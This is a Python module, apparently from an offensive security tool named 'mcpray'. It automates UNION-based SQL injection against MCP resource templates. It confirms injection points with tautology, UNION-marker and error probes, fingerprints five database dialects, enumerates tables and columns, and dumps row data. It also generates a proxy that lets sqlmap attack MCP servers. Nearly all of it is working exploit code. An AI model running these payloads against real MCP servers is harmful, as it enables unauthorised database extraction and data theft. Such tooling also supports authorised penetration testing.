"""UNION-based SQL injection enumerator for MCP resource templates and tools."""
from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field

from ..client import MCPClient

_MARKER = "MCPRAY_SQ_MARKER_7z9x"


@dataclass
class SqliResult:
    template: str
    param: str
    confirmed: bool = False
    technique: str = ""
    dialect: str = ""
    column_count: int = 0
    string_col: int = 0
    db_name: str = ""
    tables: list[str] = field(default_factory=list)
    columns: dict[str, list[str]] = field(default_factory=dict)
    data: dict[str, list[dict]] = field(default_factory=dict)
    error: str = ""


# Dialect constants
_D_SQLITE = "sqlite"
_D_MYSQL = "mysql"
_D_PGSQL = "postgresql"
_D_MSSQL = "mssql"
_D_ORACLE = "oracle"
_D_UNKNOWN = "unknown"


class SqliEnumerator:
    """UNION-based SQLi enumerator operating via MCP read_resource."""

    def __init__(self, client: MCPClient):
        self.client = client
        self._dialect: str = _D_UNKNOWN

    # ── URI helpers ────────────────────────────────────────────────────────────

    def _fill(self, template: str, param: str, value: str) -> str:
        # | is not in RFC 3986 path chars — encode it so URI parsers don't choke
        return template.replace(f"{{{param}}}", urllib.parse.quote(value, safe="'(),-_*=.!><"))

    async def _read(self, template: str, param: str, payload: str) -> str | None:
        uri = self._fill(template, param, payload)
        return await self.client.read_resource(uri)

    # ── Dialect detection ──────────────────────────────────────────────────────

    async def detect_dialect(
        self, template: str, param: str, col_count: int, str_col: int
    ) -> str:
        """Probe for DB dialect and cache in self._dialect. Returns dialect string."""
        r = await self._inject(template, param, col_count, str_col, "sqlite_version()")
        if r and r.strip() and r.strip().lower() not in ("null", "none", ""):
            self._dialect = _D_SQLITE
            return _D_SQLITE

        r = await self._inject(template, param, col_count, str_col, "version()")
        if r and r.strip():
            v = r.strip().lower()
            if "postgresql" in v or "postgres" in v:
                self._dialect = _D_PGSQL
                return _D_PGSQL
            # MariaDB/MySQL: version() returns "10.x-MariaDB" or plain "8.x.x"
            if re.match(r"^\d+\.\d+", v):
                self._dialect = _D_MYSQL
                return _D_MYSQL

        r = await self._inject(template, param, col_count, str_col, "@@version")
        if r and r.strip():
            v = r.strip().lower()
            if "microsoft sql server" in v:
                self._dialect = _D_MSSQL
                return _D_MSSQL
            if re.match(r"^\d+\.\d+", v):
                self._dialect = _D_MYSQL
                return _D_MYSQL

        r = await self._inject(
            template, param, col_count, str_col,
            "banner FROM v$version WHERE rownum=1-- "
        )
        if r and "oracle" in (r or "").lower():
            self._dialect = _D_ORACLE
            return _D_ORACLE

        self._dialect = _D_UNKNOWN
        return _D_UNKNOWN

    # ── Detection ──────────────────────────────────────────────────────────────

    async def confirm(self, template: str, param: str) -> tuple[bool, str]:
        """Return (confirmed, technique). Tries union → boolean → error."""
        # UNION-based: try 1..10 columns; use marker string in each column position
        # (NULL rows give empty responses — marker approach works for both MySQL and SQLite)
        for n in range(1, 11):
            for i in range(1, n + 1):
                parts = ["NULL"] * n
                parts[i - 1] = f"'{_MARKER}'"
                resp = await self._read(template, param, f"x' UNION SELECT {','.join(parts)}-- ")
                if resp and _MARKER in resp:
                    return True, f"union-based ({n} cols)"

        # Boolean-based: tautology returns data, contradiction returns None/empty
        # Both false_r=None and false_r="" are treated as "no data" — don't require both truthy
        true_r = await self._read(template, param, "x' OR '1'='1")
        false_r = await self._read(template, param, "x' OR '1'='2")
        if true_r and (not false_r or true_r != false_r):
            return True, "boolean-based"

        # Error-based: check if error response is surfaced in body
        resp = await self._read(template, param, "x'")
        _sql_err = ["syntax error", "ORA-", "mysql_fetch", "You have an error in your SQL",
                    "SQLiteException", "PSQLException", "Unclosed quotation",
                    "sqlite3.OperationalError", "unterminated"]
        if resp and any(e.lower() in resp.lower() for e in _sql_err):
            return True, "error-based"

        # Blind error-based: x returns different result than x' (error → None/empty)
        baseline = await self._read(template, param, "testval_mcpray")
        error_r = await self._read(template, param, "testval_mcpray'")
        if baseline != error_r:
            return True, "blind-error-based"

        return False, ""

    # ── UNION column detection ─────────────────────────────────────────────────

    async def find_columns(self, template: str, param: str) -> int:
        for n in range(1, 13):
            for i in range(1, n + 1):
                parts = ["NULL"] * n
                parts[i - 1] = f"'{_MARKER}'"
                resp = await self._read(template, param, f"x' UNION SELECT {','.join(parts)}-- ")
                if resp and _MARKER in resp:
                    return n
        return 0

    async def find_string_col(self, template: str, param: str, col_count: int) -> int:
        """Return 1-indexed column that reflects a string marker, or 0."""
        for i in range(1, col_count + 1):
            parts = ["NULL"] * col_count
            parts[i - 1] = f"'{_MARKER}'"
            payload = f"x' UNION SELECT {','.join(parts)}-- "
            resp = await self._read(template, param, payload)
            if resp and _MARKER in resp:
                return i
        return 0

    # ── Expression injection helper ────────────────────────────────────────────

    async def _inject(self, template: str, param: str, col_count: int, str_col: int,
                      expr: str) -> str:
        parts = ["NULL"] * col_count
        parts[str_col - 1] = expr
        payload = f"x' UNION SELECT {','.join(parts)}-- "
        resp = await self._read(template, param, payload)
        return (resp or "").strip()

    # ── Database fingerprint & enumeration ────────────────────────────────────

    async def get_db_name(self, template: str, param: str, col_count: int, str_col: int) -> str:
        for expr in (
            "sqlite_version()",                      # SQLite
            "database()",                            # MySQL
            "current_database()",                    # PostgreSQL
            "db_name()",                             # MSSQL
        ):
            r = await self._inject(template, param, col_count, str_col, expr)
            if r and r.lower() not in ("", "null"):
                return r
        return ""

    async def get_tables(self, template: str, param: str, col_count: int, str_col: int) -> list[str]:
        d = self._dialect

        if d not in (_D_MYSQL, _D_PGSQL, _D_MSSQL, _D_ORACLE):
            # ── SQLite strategies ──────────────────────────────────────────────
            r = await self._inject(template, param, col_count, str_col,
                "group_concat(name,char(124)) FROM sqlite_master WHERE type='table'-- ")
            if r and r.strip() and r.strip().lower() != "null":
                return [t.strip() for t in r.split("|") if t.strip()]

            r = await self._inject(template, param, col_count, str_col,
                "group_concat(tbl_name,char(124)) FROM sqlite_master-- ")
            if r and r.strip() and r.strip().lower() != "null":
                return [t.strip() for t in r.split("|")
                        if t.strip() and not t.strip().lower().startswith("sqlite_")]

            tables: list[str] = []
            for offset in range(20):
                r = await self._inject(template, param, col_count, str_col,
                    f"name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {offset}-- ")
                if not r or r.strip().lower() in ("", "null", "none"):
                    break
                tables.append(r.strip())
            if tables:
                return tables

            if d == _D_SQLITE:
                return []

        if d not in (_D_SQLITE, _D_PGSQL, _D_MSSQL, _D_ORACLE):
            # ── MySQL / MariaDB ────────────────────────────────────────────────
            r = await self._inject(template, param, col_count, str_col,
                "group_concat(table_name separator ',') FROM information_schema.tables "
                "WHERE table_schema=database()-- ")
            if r and r.strip():
                return [t.strip() for t in r.split(",") if t.strip()]

            if d == _D_MYSQL:
                return []

        if d not in (_D_SQLITE, _D_MYSQL, _D_MSSQL, _D_ORACLE):
            # ── PostgreSQL ─────────────────────────────────────────────────────
            r = await self._inject(template, param, col_count, str_col,
                "string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'-- ")
            if r and r.strip():
                return [t.strip() for t in r.split(",") if t.strip()]

            if d == _D_PGSQL:
                return []

        if d not in (_D_SQLITE, _D_MYSQL, _D_PGSQL, _D_ORACLE):
            # ── MSSQL ──────────────────────────────────────────────────────────
            r = await self._inject(template, param, col_count, str_col,
                "stuff((select ',' + name from sys.tables for xml path('')),1,1,'')-- ")
            if r and r.strip():
                return [t.strip() for t in r.split(",") if t.strip()]

            if d == _D_MSSQL:
                return []

        if d not in (_D_SQLITE, _D_MYSQL, _D_PGSQL, _D_MSSQL):
            # ── Oracle ─────────────────────────────────────────────────────────
            r = await self._inject(template, param, col_count, str_col,
                "listagg(table_name,',') within group (order by table_name) "
                "FROM all_tables WHERE owner=user-- ")
            if r and r.strip():
                return [t.strip() for t in r.split(",") if t.strip()]

        return []

    async def get_columns(self, template: str, param: str, col_count: int, str_col: int,
                          table: str) -> list[str]:
        d = self._dialect

        if d not in (_D_MYSQL, _D_PGSQL, _D_MSSQL, _D_ORACLE):
            # SQLite — pragma_table_info
            r = await self._inject(template, param, col_count, str_col,
                f"group_concat(name,char(124)) FROM pragma_table_info('{table}')-- ")
            if r and r.strip() and r.strip().lower() != "null":
                return [c.strip() for c in r.split("|") if c.strip()]

            cols: list[str] = []
            for offset in range(30):
                r = await self._inject(template, param, col_count, str_col,
                    f"name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {offset}-- ")
                if not r or r.strip().lower() in ("", "null", "none"):
                    break
                cols.append(r.strip())
            if cols:
                return cols

            if d == _D_SQLITE:
                return []

        if d not in (_D_SQLITE, _D_MSSQL, _D_ORACLE):
            # MySQL / PostgreSQL — information_schema.columns
            r = await self._inject(template, param, col_count, str_col,
                f"group_concat(column_name separator ',') FROM information_schema.columns "
                f"WHERE table_name='{table}'-- ")
            if r and r.strip():
                return [c.strip() for c in r.split(",") if c.strip()]

            if d in (_D_MYSQL, _D_PGSQL):
                return []

        if d not in (_D_SQLITE, _D_MYSQL, _D_PGSQL, _D_ORACLE):
            # MSSQL — sys.columns
            r = await self._inject(template, param, col_count, str_col,
                f"stuff((select ',' + name from sys.columns where object_id="
                f"object_id('{table}') for xml path('')),1,1,'')-- ")
            if r and r.strip():
                return [c.strip() for c in r.split(",") if c.strip()]

            if d == _D_MSSQL:
                return []

        if d not in (_D_SQLITE, _D_MYSQL, _D_PGSQL, _D_MSSQL):
            # Oracle — all_tab_columns
            r = await self._inject(template, param, col_count, str_col,
                f"listagg(column_name,',') within group (order by column_id) "
                f"FROM all_tab_columns WHERE table_name=upper('{table}')-- ")
            if r and r.strip():
                return [c.strip() for c in r.split(",") if c.strip()]

        return []

    async def dump_table(self, template: str, param: str, col_count: int, str_col: int,
                         table: str, columns: list[str], limit: int = 20) -> list[dict]:
        if not columns:
            return []

        d = self._dialect
        col_sep = "char(126,124,126)"    # ~|~
        row_sep = "char(10,124,124,10)"  # \n||\n

        if d not in (_D_MYSQL, _D_PGSQL, _D_MSSQL, _D_ORACLE):
            # ── SQLite: || concat + group_concat ──────────────────────────────
            col_expr = f"||{col_sep}||".join(f"COALESCE(CAST({c} AS TEXT),'')" for c in columns)
            r = await self._inject(template, param, col_count, str_col,
                f"group_concat({col_expr},{row_sep}) FROM {table} LIMIT {limit}-- ")
            if r and "~|~" in r:
                rows = []
                for row_str in r.split("\n||\n"):
                    vals = row_str.split("~|~")
                    rows.append(dict(zip(columns, vals)))
                return rows
            if d == _D_SQLITE:
                # LIMIT/OFFSET fallback for SQLite
                rows = []
                for offset in range(limit):
                    r = await self._inject(template, param, col_count, str_col,
                        f"{col_expr} FROM {table} LIMIT 1 OFFSET {offset}-- ")
                    if not r:
                        break
                    vals = r.split("~|~") if len(columns) > 1 else [r]
                    rows.append(dict(zip(columns, vals)))
                return rows

        if d not in (_D_SQLITE, _D_MSSQL, _D_ORACLE):
            # ── MySQL / MariaDB: CONCAT + GROUP_CONCAT ────────────────────────
            if len(columns) == 1:
                col_expr_m = f"IFNULL(CONVERT({columns[0]},CHAR),'')"
            else:
                concat_args = ", CHAR(126,124,126), ".join(
                    f"IFNULL(CONVERT({c},CHAR),'')" for c in columns
                )
                col_expr_m = f"CONCAT({concat_args})"
            r = await self._inject(template, param, col_count, str_col,
                f"GROUP_CONCAT({col_expr_m} SEPARATOR '|||') FROM {table}-- ")
            if r:
                rows = []
                for row_str in r.split("|||")[:limit]:
                    vals = row_str.split("~|~") if len(columns) > 1 else [row_str]
                    rows.append(dict(zip(columns, vals)))
                return rows

        if d not in (_D_SQLITE, _D_MYSQL, _D_ORACLE):
            # ── MSSQL: string_agg / stuff+for xml ────────────────────────────
            if len(columns) == 1:
                col_expr_s = f"isnull(cast({columns[0]} as nvarchar(max)),'')"
            else:
                parts_s = "+'~|~'+".join(f"isnull(cast({c} as nvarchar(max)),'')" for c in columns)
                col_expr_s = parts_s
            r = await self._inject(template, param, col_count, str_col,
                f"stuff((select '|||'+{col_expr_s} from {table} for xml path(''),type)"
                f".value('.','nvarchar(max)'),1,3,'')-- ")
            if r:
                rows = []
                for row_str in r.split("|||")[:limit]:
                    vals = row_str.split("~|~") if len(columns) > 1 else [row_str]
                    rows.append(dict(zip(columns, vals)))
                return rows

        if d not in (_D_SQLITE, _D_MYSQL, _D_PGSQL, _D_MSSQL):
            # ── Oracle: listagg ───────────────────────────────────────────────
            if len(columns) == 1:
                col_expr_o = f"nvl(to_char({columns[0]}),'')"
            else:
                parts_o = "||'~|~'||".join(f"nvl(to_char({c}),'')" for c in columns)
                col_expr_o = parts_o
            r = await self._inject(template, param, col_count, str_col,
                f"listagg({col_expr_o},'|||') within group (order by rownum) "
                f"FROM {table} WHERE rownum<={limit}-- ")
            if r:
                rows = []
                for row_str in r.split("|||"):
                    vals = row_str.split("~|~") if len(columns) > 1 else [row_str]
                    rows.append(dict(zip(columns, vals)))
                return rows

        # ── Universal LIMIT/OFFSET fallback ───────────────────────────────────
        col_expr_fb: str
        if d == _D_MYSQL:
            if len(columns) == 1:
                col_expr_fb = f"IFNULL(CONVERT({columns[0]},CHAR),'')"
            else:
                concat_args = ", CHAR(126,124,126), ".join(
                    f"IFNULL(CONVERT({c},CHAR),'')" for c in columns
                )
                col_expr_fb = f"CONCAT({concat_args})"
        else:
            col_expr_fb = f"||{col_sep}||".join(f"COALESCE(CAST({c} AS TEXT),'')" for c in columns)

        rows = []
        for offset in range(limit):
            r = await self._inject(template, param, col_count, str_col,
                f"{col_expr_fb} FROM {table} LIMIT 1 OFFSET {offset}-- ")
            if not r:
                break
            vals = r.split("~|~") if len(columns) > 1 else [r]
            rows.append(dict(zip(columns, vals)))
        return rows

    # ── Auto-detect injectable templates from inventory ────────────────────────

    async def detect_injectable_templates(self, inventory_templates: list[dict]) -> list[tuple[str, str]]:
        """Return list of (uri_template, param_name) pairs that are injectable."""
        injectable = []
        for tmpl in inventory_templates:
            uri = tmpl.get("uriTemplate", "")
            params = re.findall(r"\{([^}]+)\}", uri)
            for param in params:
                confirmed, _ = await self.confirm(uri, param)
                if confirmed:
                    injectable.append((uri, param))
                    break
        return injectable

    # ── Main entry point ───────────────────────────────────────────────────────

    async def run(
        self,
        template: str,
        param: str,
        dump_tables: bool = False,
        dump_all: bool = False,
    ) -> SqliResult:
        result = SqliResult(template=template, param=param)

        confirmed, technique = await self.confirm(template, param)
        if not confirmed:
            return result

        result.confirmed = True
        result.technique = technique

        # Resolve column count from technique string or re-detect
        m = re.search(r"(\d+) cols", technique)
        col_count = int(m.group(1)) if m else await self.find_columns(template, param)
        if not col_count:
            result.error = "Could not determine UNION column count"
            return result
        result.column_count = col_count

        str_col = await self.find_string_col(template, param, col_count)
        if not str_col:
            result.error = "No string-injectable UNION column found"
            return result
        result.string_col = str_col

        result.dialect = await self.detect_dialect(template, param, col_count, str_col)
        result.db_name = await self.get_db_name(template, param, col_count, str_col)

        if dump_tables or dump_all:
            result.tables = await self.get_tables(template, param, col_count, str_col)

        if dump_all and result.tables:
            for table in result.tables:
                cols = await self.get_columns(template, param, col_count, str_col, table)
                result.columns[table] = cols
                if cols:
                    result.data[table] = await self.dump_table(
                        template, param, col_count, str_col, table, cols
                    )

        return result


# ── sqlmap proxy generator ─────────────────────────────────────────────────────

def generate_sqlmap_proxy(template: str, param: str, target: str, port: int = 18080) -> tuple[str, str]:
    """Return (proxy_script_content, sqlmap_command)."""
    safe_template = template.replace("\\", "\\\\").replace('"', '\\"')
    script = f'''\
#!/usr/bin/env python3
"""Auto-generated sqlmap MCP proxy — bridges sqlmap HTTP <-> MCP read_resource.
Usage: python sqli_proxy.py  (then run the sqlmap command printed below)
"""
import asyncio
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

import sys
sys.path.insert(0, ".")

from mcpray.client import MCPClient

MCP_TARGET = "{target}"
TEMPLATE   = "{safe_template}"
PARAM      = "{param}"
PORT       = {port}

_loop = asyncio.new_event_loop()
_client: MCPClient | None = None


def _sync_read(payload: str) -> str:
    async def _inner():
        global _client
        if _client is None:
            _client = MCPClient(MCP_TARGET)
            await _client.__aenter__()
        uri = TEMPLATE.replace("{{" + PARAM + "}}", urllib.parse.quote(payload, safe="\'(),-_*|"))
        result = await _client.read_resource(uri)
        return result or ""
    return asyncio.run_coroutine_threadsafe(_inner(), _loop).result(timeout=15)


class _Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        qs = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(qs)
        payload = params.get(PARAM, [""])[0]
        try:
            body = _sync_read(payload).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        except Exception as e:
            self.send_error(500, str(e))


def _run_loop():
    _loop.run_forever()


if __name__ == "__main__":
    t = threading.Thread(target=_run_loop, daemon=True)
    t.start()
    print(f"[*] MCP proxy listening on http://127.0.0.1:{{PORT}}")
    print(f"[*] Bridging sqlmap -> MCP {{MCP_TARGET}}")
    print(f"[*] Template: {{TEMPLATE}}")
    sqlmap_cmd = (
        f"sqlmap -u \\"http://127.0.0.1:{{PORT}}/?{{PARAM}}=test\\" "
        f"--level=3 --risk=2 --batch --dbms=sqlite "
        f"--technique=U --threads=1"
    )
    print(f"\\n[+] sqlmap command:\\n    {{sqlmap_cmd}}\\n")
    HTTPServer(("127.0.0.1", PORT), _Handler).serve_forever()
'''

    sqlmap_cmd = (
        f"sqlmap -u \"http://127.0.0.1:{port}/?{param}=test\" "
        f"--level=3 --risk=2 --batch --dbms=sqlite "
        f"--technique=U --threads=1"
    )
    return script, sqlmap_cmd
